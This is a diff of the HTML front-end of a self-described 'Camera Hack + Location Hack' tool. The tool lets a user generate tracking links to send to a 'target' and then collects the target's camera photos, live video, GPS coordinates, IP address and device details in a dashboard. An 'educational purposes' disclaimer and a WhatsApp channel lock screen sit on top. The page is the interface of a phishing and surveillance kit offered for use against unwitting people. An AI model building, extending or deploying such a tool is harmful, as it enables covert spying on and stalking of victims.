@@ -1,185 +1,191 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>CAMERA HACK + LOCATION HACK TOOL</title>
-  <link rel="stylesheet" href="style.css">
-  <style>
-    .badge-module.loc { background: rgba(34,197,94,.2); color: #86efac; }
-    .badge-module.ip  { background: rgba(255,145,0,.2); color: #ffd54f; }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CAMERA HACK + LOCATION HACK TOOL</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        #lock-screen { position: fixed; inset: 0; z-index: 9999; background: radial-gradient(1200px 600px at 50% -10%, #241503 0%, #0b0b14 60%); display: flex; align-items: center; justify-content: center; flex-direction: column; padding: 30px 20px; transition: opacity 0.5s ease, transform 0.5s ease; }
+        #lock-screen.hidden-lock { opacity: 0; transform: scale(0.95); pointer-events: none; }
+        .lock-box { max-width: 450px; width: 100%; background: linear-gradient(160deg, #181826, #1f1f30); border: 2px solid #ff9100; border-radius: 24px; padding: 35px 28px; text-align: center; box-shadow: 0 0 40px rgba(255,145,0,.25); }
+        .lock-box .lock-icon { font-size: 64px; margin-bottom: 10px; }
+        .lock-box h1 { font-size: 32px; font-weight: 900; background: linear-gradient(90deg, #ffd54f, #ff9100, #ff3d00); -webkit-background--clip: text; background-clip: text; color: transparent; margin-bottom: 6px; }
+        .lock-box .sub-text { color: #8a8aa5; font-size: 15px; margin: 12px 0 18px; line-height: 1.6; }
+        .lock-box .channel-name { display: inline-block; background: rgba(37,211,102,.12); border: 1px solid rgba(37,211,102,.3); color: #25d366; padding: 6px 16px; border-radius: 20px; font-size: 13px; font-weight: 700; margin-bottom: 18px; }
+        .btn-follow { border: none; cursor: pointer; padding: 16px 32px; border-radius: 16px; font-weight: 700; font-size: 18px; transition: .2s; color: #fff; background: linear-gradient(135deg, #25d366, #128C7E); box-shadow: 0 0 24px rgba(37,211,102,.35); width: 100%; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        .btn-follow:hover { transform: translateY(-3px); filter: brightness(1.1); }
+        .btn-follow:disabled { opacity: .5; cursor: not-allowed; transform: none; }
+        .btn-unlock { border: none; cursor: pointer; padding: 14px 28px; border-radius: 14px; font-weight: 700; font-size: 16px; transition: .2s; color: #fff; background: linear-gradient(135deg, #ff9100, #ff3d00); box-shadow: 0 0 18px rgba(255,145,0,.35); width: 100%; margin-top: 12px; }
+        .btn-unlock:hover { transform: translateY(-2px); filter: brightness(1.15); }
+        .lock-status { margin-top: 14px; padding: 10px; border-radius: 12px; font-size: 13px; font-weight: 600; }
+        .lock-status.checking { background: rgba(255,213,79,.1); color: #ffd54f; border: 1px solid rgba(255,213,79,.3); }
+        .lock-status.success { background: rgba(37,211,102,.1); color: #25d366; border: 1px solid rgba(37,211,102,.3); }
+        .lock-status.error { background: rgba(239,68,68,.1); color: #fca5a5; border: 1px solid rgba(239,68,68,.3); }
+        .lock-box .footer-note { margin-top: 18px; font-size: 12px; color: #4a4a5a; }
+        .module-card.selected { border-color: var(--green); box-shadow: 0 0 20px rgba(34,197,94,.25); }
+        .module-card.selected::after { content: '✅ SELECTED'; display: block; font-size: 10px; color: var(--green); font-weight: 700; margin-top: 4px; }
+        .target-list { margin-top: 14px; }
+        .target-item { display: flex; justify-content: space-between; align-items: center; padding: 10px 14px; background: var(--bg2); border: 1px solid var(--border); border-radius: 10px; margin-bottom: 8px; font-size: 13px; }
+        .target-item .t-type { padding: 2px 8px; border-radius: 10px; font-size: 10px; font-weight: 700; }
+        .target-item .t-type.cam { background: rgba(59,130,246,.2); color: #93c5fd; }
+        .target-item .t-type.loc { background: rgba(34,197,94,.2); color: #86efac; }
+        .target-item .t-type.ip { background: rgba(168,85,247,.2); color: #c4a5f7; }
+        .target-item .t-status { font-size: 11px; }
+        .target-item .t-status.hit { color: var(--green); }
+        .target-item .t-status.wait { color: var(--gold); }
+        .ip-stat-box { text-align: center; padding: 25px; }
+        .ip-stat-box .big-num { font-size: 42px; color: var(--purple); font-weight: 900; }
+        .ip-stat-box .stat-label { color: var(--muted); font-size: 12px; margin-top: 4px; }
+        .section-title { font-size: 20px; color: var(--gold); margin: 20px 0 10px; }
+        .desc-text { color: var(--muted); font-size: 13px; margin-bottom: 16px; }
+        /* Save Button Style */
+        .btn-save-gallery { background: rgba(34,197,94,.15); color: #22c55e; border: 1px solid rgba(34,197,94,.3); padding: 4px 10px; border-radius: 8px; cursor: pointer; font-size: 11px; font-weight: 700; margin-top: 6px; display: inline-block; text-decoration: none; }
+        .btn-save-gallery:hover { background: rgba(34,197,94,.3); }
+    </style>
 </head>
 <body>
-  <div id="lock-screen">
-    <div class="lock-box">
-      <div class="lock-icon">🔒</div>
-      <h1>TOOL LOCK</h1>
-      <div class="sub-text">
-        Follow my WhatsApp channel to unlock this tool<br>
-        <span style="font-size:13px;color:#6a6a85;">Channel unlock required for EDUCATIONAL PURPOSE</span>
-      </div>
-      <div class="channel-name">Oficial Channel</div>
-      <button id="btn-follow-channel" class="btn-follow" onclick="window.open('https://whatsapp.com/channel/0029VbB47ttDDmFNztpnZf2m', '_blank')">
-        <span>📱</span> Follow Channel
-      </button>
-      <button id="btn-unlock-tool" class="btn-unlock">
-         I've Followed — Unlock Tool
-      </button>
-      <div id="lock-status" class="lock-status hidden"></div>
-      <div class="footer-note">⚠️ You must follow the channel to use this tool</div>
-    </div>
-  </div>
-
-  <nav class="navbar">
-    <div class="logo">Cam<span>Hack</span> + Loc<span>Hack</span></div>
-    <div class="nav-tabs">
-      <button class="nav-tab active" data-section="home">Home</button>
-      <button class="nav-tab" data-section="dashboard">Dashboard</button>
-      <button class="nav-tab" data-section="targets">Targets</button>
-      <button class="nav-tab" data-section="reviews">Reviews</button>
-    </div>
-    <div class="nav-user">
-      <span id="nav-username">Guest</span>
-      <button id="btn-login" class="btn btn-sm">Login</button>
-      <button id="btn-logout" class="btn btn-sm btn-danger hidden">Logout</button>
-    </div>
-  </nav>
-
-  <div id="section-home" class="page-section active">
-    <div class="banner">
-      <h1><span class="icon">📸</span> Camera & Video Hack</h1>
-      <p class="dev">Developer: <b>Nawab Zada Hacker ☠️🙌🦅</b></p>
-      <p class="edu-note">⚠️ This tool is only for Educational Purposes. Please don't use wrong.</p>
-    </div>
-
-    <div class="section-title">Select Module</div>
-    <p class="desc-text">Select a module to generate a tracking link. Send the link to your target.</p>
-
-    <div class="modules-grid" id="modules-grid">
-      <div class="module-card" data-module="camera">
-        <div class="icon">📷</div>
-        <h3>Camera Hack</h3>
-        <p>Capture front/back camera photos when target allows access</p>
-        <span class="badge-module cam">CAMERA</span>
-      </div>
-
-      <div class="module-card" data-module="video">
-        <div class="icon">🎥</div>
-        <h3>Video Hack</h3>
-        <p>Record live video when target allows access</p>
-        <span class="badge-module cam">VIDEO</span>
-      </div>
-
-      <div class="module-card" data-module="location">
-        <div class="icon">📍</div>
-        <h3>Location Hack</h3>
-        <p>Capture GPS coordinates when target opens the link</p>
-        <span class="badge-module loc">LOCATION</span>
-      </div>
-
-      <div class="module-card" data-module="ip">
-        <div class="icon">🌐</div>
-        <h3>IP Hack</h3>
-        <p>Capture IP address when target opens the link</p>
-        <span class="badge-module ip">IP ADDRESS</span>
-      </div>
-    </div>
-
-    <div id="link-generator" class="link-gen-box hidden">
-      <h3>Your Generated Link</h3>
-      <p class="muted" style="font-size:13px; margin-bottom:10px;">
-        Send this link to your target. When they open it, data will appear in your dashboard.
-      </p>
-      <div class="link-display">
-        <input type="text" id="generated-link" readonly value="Select a module first...">
-        <button class="copy-btn" id="btn-copy-link">Copy</button>
-      </div>
-      <button id="btn-new-link" class="btn btn-blue btn-sm">Generate New Link</button>
-      <span id="link-type-badge" style="display:inline-block; margin-left: 8px; padding:2px 10px; border-radius:10px; font-size:11px; font-weight:700;"></span>
-    </div>
-  </div>
-
-  <div id="section-dashboard" class="page-section">
-    <div class="banner" style="padding:15px;">
-      <h1 style="font-size:22px;">CAPTURE Dashboard</h1>
-    </div>
-
-    <div class="dashboard-grid">
-      <div class="dash-card">
-        <h3>Camera Captures</h3>
-        <div id="camera-captures">
-          <p class="muted" style="text-align:center;padding:20px;">No camera captures yet. Generate a link and send to target.</p>
+    <div id="lock-screen">
+        <div class="lock-box">
+            <div class="lock-icon">🔒</div>
+            <h1>TOOL LOCK</h1>
+            <div class="sub-text"> Follow my WhatsApp channel to unlock this tool<br> <span style="font-size:13px;color:#6a6a85;">Channel unlock required for EDUCATIONAL PERPOSE</span> </div>
+            <div class="channel-name">Oficial Channel</div>
+            <button id="btn-follow-channel" class="btn-follow" onclick="window.open('https://whatsapp.com/channel/0029VbB47ttDDmFNztpnZf2m', '_blank')"> <span>📱</span> Follow Channel </button>
+            <button id="btn-unlock-tool" class="btn-unlock"> I've Followed — Unlock Tool </button>
+            <div id="lock-status" class="lock-status hidden"></div>
+            <div class="footer-note">⚠️ You must follow the channel to use this tool</div>
         </div>
-      </div>
+    </div>
 
-      <div class="dash-card">
-        <h3>Video Captures</h3>
-        <div id="video-captures">
-          <p class="muted" style="text-align:center;padding:20px;">No video captures yet. Generate a link and send to target.</p>
+    <nav class="navbar">
+        <div class="logo">Cam<span>Hack</span> + Loc<span>Hack</span></div>
+        <div class="nav-tabs">
+            <button class="nav-tab active" data-section="home">Home</button>
+            <button class="nav-tab" data-section="dashboard">Dashboard</button>
+            <button class="nav-tab" data-section="targets">Targets</button>
+            <button class="nav-tab" data-section="reviews">Reviews</button>
         </div>
-      </div>
-
-      <div class="dash-card">
-        <h3>Location Captures</h3>
-        <div id="location-captures">
-          <p class="muted" style="text-align:center;padding:20px;">No location captures yet. Generate a link and send to target.</p>
+        <div class="nav-user">
+            <span id="nav-username">Guest</span>
+            <button id="btn-login" class="btn btn-sm">Login</button>
+            <button id="btn-logout" class="btn btn-sm btn-danger hidden">Logout</button>
         </div>
-      </div>
+    </nav>
 
-      <div class="dash-card">
-        <h3>IP Address Captures</h3>
-        <div id="ip-captures">
-          <p class="muted" style="text-align:center;padding:20px;">No IP captures yet. Generate a link and send to target.</p>
+    <div id="section-home" class="page-section active">
+        <div class="banner">
+            <h1><span class="icon">📸</span> Camera & Location Hack <span class="icon">📍</span></h1>
+            <p class="dev">Developer: <b>Nawab Zada Hacker ☠️🙌🦅</b></p>
+            <p class="edu-note">⚠️ This tool is only for Educational Purposes. Please don't use wrong.</p>
         </div>
-      </div>
+        <div class="section-title">Select Module</div>
+        <p class="desc-text">Select a module to generate a tracking link. Send the link to your target.</p>
+        <div class="modules-grid" id="modules-grid">
+            <div class="module-card" data-module="camera">
+                <div class="icon">📷</div>
+                <h3>Camera Hack</h3>
+                <p>Capture front/back camera photos continuously (Live)</p>
+                <span class="badge-module cam">CAMERA</span>
+            </div>
+            <div class="module-card" data-module="location">
+                <div class="icon">📍</div>
+                <h3>Location Hack</h3>
+                <p>Get live GPS location when target allows access</p>
+                <span class="badge-module loc">LOCATION</span>
+            </div>
+            <div class="module-card" data-module="ip">
+                <div class="-icon">🌐</div>
+                <h3>IP Tracker</h3>
+                <p>Capture IP address, device model, browser info instantly</p>
+                <span class="-badge-module ip">IP TRACE</span>
+            </div>
+        </div>
+        <div id="link-generator" class="link-gen-box hidden">
+            <h3>Your Generated Link</h3>
+            <p class="muted" style="font-size:13px; margin-bottom:10px;"> Send this link to your target. When they open it, data will appear in your dashboard. </p>
+            <div class="link-display">
+                <input type="text" id="generated-link" readonly value="Select a module first...">
+                <button class="copy-btn" id="btn-copy-link">Copy</button>
+            </div>
+            <button id="btn-new-link" class="btn btn-blue btn-sm">Generate New Link</button>
+            <span id="link-type-badge" style="display:inline-block; margin-left: 8px; padding:2px 10px; border-radius:10px; font-size:11px; font-weight:700;"></span>
+        </div>
     </div>
-  </div>
 
-  <div id="section-targets" class="page-section">
-    <div class="banner" style="padding:15px;">
-      <h1 style="font-size:22px;">Your Generated Links</h1>
+    <div id="section-dashboard" class="page-section">
+        <div class="banner" style="padding:15px;">
+            <h1 style="font-size:22px;">CAPTURE Dashboard</h1>
+        </div>
+        <div class="dashboard-grid">
+            <div class="dash-card">
+                <h3>Camera Captures (Live)</h3>
+                <div id="camera-captures">
+                    <p class="muted" style="text-align:center; padding:20px;">No camera captures yet. Generate a link and send it to target.</p>
+                </div>
+            </div>
+            <div class="dash-card">
+                <h3>Location Captures</h3>
+                <div id="location-captures">
+                    <p class="muted" style="text-align:center; padding:20px;">No location captures yet. Generate a link and send it to target.</p>
+                </div>
+            </div>
+            <div class="dash-card">
+                <h3>IP Traces</h3>
+                <div id="ip-traces">
+                    <p class="muted" style="text-align:center; padding:20px;">No IP traces yet. Generate a link to start tracking.</p>
+                </div>
+            </div>
+        </div>
     </div>
-    <div id="targets-list" class="target-list">
-      <p class="muted" style="text-align:center;padding:20px;">No links generated yet. Go to Home and select a TARGET MODEL.</p>
-    </div>
-  </div>
 
-  <div id="section-reviews" class="page-section">
-    <div class="banner" style="padding:15px;">
-      <h1 style="font-size:22px;">⭐ User Reviews</h1>
-    </div>
-
-    <div class="link-gen-box" style="margin-bottom:20px;">
-      <h3>Write a Review</h3>
-      <input type="text" id="review-name" class="input" placeholder="Your Name" style="margin-bottom:8px;">
-      <textarea id="review-text" class="input" rows="3" placeholder="Write your experience with this tool..."></textarea>
-      <button id="btn-submit-review" class="btn btn-success btn-block" style="margin-top:8px;">Post Review</button>
+    <div id="section-targets" class="page-section">
+        <div class="banner" style="padding:15px;">
+            <h1 style="font-size:22px;">Your Generated Links</h1>
+        </div>
+        <div id="targets-list" class="target-list">
+            <p class="muted" style="text-align:center; padding:20px;">No links generated yet. Go to Home and select a TARGET MODEL.</p>
+        </div>
     </div>
 
-    <div id="reviews-container"></div>
-  </div>
-
-  <div id="auth-modal" class="modal hidden">
-    <div class="modal-box">
-      <button class="modal-close" id="btn-close-modal">✕</button>
-      <h2 id="auth-title">Login</h2>
-      <div id="auth-error" class="auth-error hidden"></div>
-      <input type="text" id="auth-username" class="input" placeholder="Username">
-      <input type="email" id="auth-email" class="input" placeholder="Email">
-      <input type="password" id="auth-pass" class="input" placeholder="Password">
-      <button id="btn-auth-submit" class="btn btn-block">Login</button>
-      <p class="auth-switch"><a id="auth-toggle">Don't have account? Signup</a></p>
+    <div id="section-reviews" class="page-section">
+        <div class="banner" style="padding:15px;">
+            <h1 style="font-size:22px;">⭐ User Reviews</h1>
+        </div>
+        <div class="link-gen-box" style="margin-bottom:20px;">
+            <h3>Write a Review</h3>
+            <input type="text" id="review-name" class="-input" placeholder="Your Name" style="margin-bottom:8px;">
+            <textarea id="review-text" class="input" rows="3" placeholder="Write your experience with this tool..."></textarea>
+            <button id="btn-submit-review" class="btn btn-success btn-block" style="margin-top:8px;">Post Review</button>
+        </div>
+        <div id="reviews-container"></div>
     </div>
-  </div>
 
-  <div id="toast" class="toast hidden"></div>
+    <div id="section-admin" class="page-section" style="display:none;">
+        <p style="text-align:center;padding:40px;">
+            <a href="admin.html" class="btn" style="font-size:18px;padding:16px 40px;">Open Admin Panel</a>
+        </p>
+    </div>
 
-  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-auth-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-storage-compat.js"></script>
-  <script src="firebase-config.js"></script>
-  <script src="app.js"></script>
+    <div id="auth-modal" class="modal hidden">
+        <div class="modal-box">
+            <button class="modal-close" id="btn-close-modal">✕</button>
+            <h2 id="auth-title">Login</h2>
+            <div id="auth-error" class="-auth-error hidden"></div>
+            <input type="text" id="auth-username" class="input" placeholder="Username">
+            <input type="email" id="auth-email" class="input" placeholder="Email">
+            <input type="password" id="auth-pass" class="input" placeholder="Password">
+            <button id="btn-auth-submit" class="btn btn-block">Login</button>
+            <p class="auth-switch"><a id="auth-toggle">Don't have account? Signup</a></p>
+        </div>
+    </div>
+
+    <div id="toast" class="toast hidden"></div>
+
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
+    <script src="firebase-config.js"></script>
+    <script src="app.js"></script>
 </body>
 </html>
